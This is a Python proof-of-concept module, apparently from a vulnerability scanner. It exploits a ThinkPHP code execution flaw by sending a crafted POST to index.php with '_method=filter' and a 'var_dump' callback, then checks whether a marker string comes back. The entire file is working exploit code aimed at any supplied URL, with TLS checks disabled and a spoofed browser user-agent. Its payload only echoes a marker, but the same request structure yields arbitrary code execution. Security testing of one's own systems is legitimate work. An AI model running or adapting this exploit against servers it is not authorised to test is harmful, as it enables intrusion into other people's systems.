#!/usr/bin/env python
# coding=utf-8
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
}
payload = {
    'c': 'var_dump',
    'f': '4e5e5d7364f443e28fbf0d3ae744a59a',
    '_method': 'filter',
}


async def thinkphp_method_filter_code_exec_verify(url):
    pocdict = get_pocdict(vulnname=__name__)
    try:
        url = urljoin(url, 'index.php')
        resp = requests.post(url, data=payload, headers=headers, timeout=15, verify=False)
        if '4e5e5d7364f443e28fbf0d3ae744a59a' in resp.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = url
            pocdict['payload'] = payload
            pocdict['proof'] = '4e5e5d7364f443e28fbf0d3ae744a59a'
            pocdict['response'] = resp.text
    except Exception as e:
        pocdict['exception'] = str(e)
    return pocdict
